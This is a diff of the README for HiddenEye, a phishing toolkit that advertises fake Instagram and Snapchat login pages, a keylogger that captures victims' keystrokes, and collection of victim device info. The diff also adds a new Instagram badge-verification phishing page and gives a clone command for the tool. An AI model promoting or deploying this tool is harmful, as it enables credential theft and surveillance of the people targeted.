@@ -6,6 +6,11 @@
       Modern phishing tool with advanced functionality 
 </p>
 
+<p align="center"> 
+  
+  [![Codacy Badge](https://api.codacy.com/project/badge/Grade/cd8aa9a99b5b4afd84e19a98b7b30211)](https://app.codacy.com/app/DarkSecDevelopers/HiddenEye?utm_source=github.com&utm_medium=referral&utm_content=DarkSecDevelopers/HiddenEye&utm_campaign=Badge_Grade_Dashboard)
+</p>
+
 <p align="center">
  NOW WE HAVE ADDED KEYLOGGER WITH THE PHISHING PAGES // VICTIM DEVICE INFO ALSO AVAILABLE
  
@@ -14,17 +19,17 @@
 
 
 ### DEVELOPERS:-
-1) UNDEADSEC (https://github.com/UndeadSec)
+1) ANONUD4Y (https://github.com/An0nUD4Y)
 2) USAMA ABDUL SATTAR (https://github.com/usama7628674)
-3) ANONUD4Y (https://github.com/An0nUD4Y)
-4) Artur Tretiak (https://github.com/sTiKyt)
+3) sTiKyt (https://github.com/sTiKyt)
+4) UNDEADSEC (https://github.com/UndeadSec)
 5) Micrafast (https://github.com/Micrafast)
 6) ___________ (WAITING FOR YOU)
 
 ## CREDIT:-
 * Usama ( A Most active Developer)
 * Anonud4y ( I can't remember if i have done Anything )
-* Artur ( Guy Who recustomized everything )
+* sTiKyt ( Guy Who recustomized everything )
 * UNDEADSEC (For His wonderful repo socialfish which motivated us a lot)
 * TheLinuxChoice ( For The ideas from his repo Shellphish )
 
@@ -56,15 +61,17 @@
 **3) KEYLOGGER**
 - Now you will also have the ability to capture all the keystokes of victim.
 - You can now Deploy Keyloggers With (Y/N) option.
+
 **4) TERMUX-SUPPORT-BRANCH ADDED**
 - We care about Android Users, As Termux doesn't have 'sudo' command as default, So we have created another branch of HiddenEye For Our Termux Users.
-[CHECK HERE](https://github.com/DarkSecDevelopers/HiddenEye/blob/Termux-Support-Branch)
+[CHECK HERE](https://github.com/DarkSecDevelopers/HiddenEye/tree/Termux-Support-Branch)
 - Termux Users Please Clone With This command
 ```
 git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye.git
 
 ```
-**5) NEW LOOK PROVIDED
+
+**5) NEW LOOK PROVIDED**
 - NOW FOCUS EASILY ON TASKS...
 
 ## FOR FURTHER INSTALLATION PROCEDURE - [(CHECK INSTRUCTIONS)](https://github.com/DarkSecDevelopers/HiddenEye/blob/master/instructions.md)
@@ -100,6 +107,7 @@ git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEy
 - Traditional Instagram login page.
 - Instagram Autoliker Phishing Page.
 - Instagram Profile Scenario Advanced attack.
+- Instagram Badge Verify Attack *[New]*
 
 ### NEW PAGES
 <p align="center">
@@ -114,6 +122,7 @@ git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEy
  - Traditional Login Page
  - Fake instagram Autoliker Page
  - Instagram Profile Scenario Advanced attack.
+ - Instagram Badge Verify Attack *[New]*
  
  **3) SNAPCHAT PHISHING:**
  - Traditional Snapchat Login Page
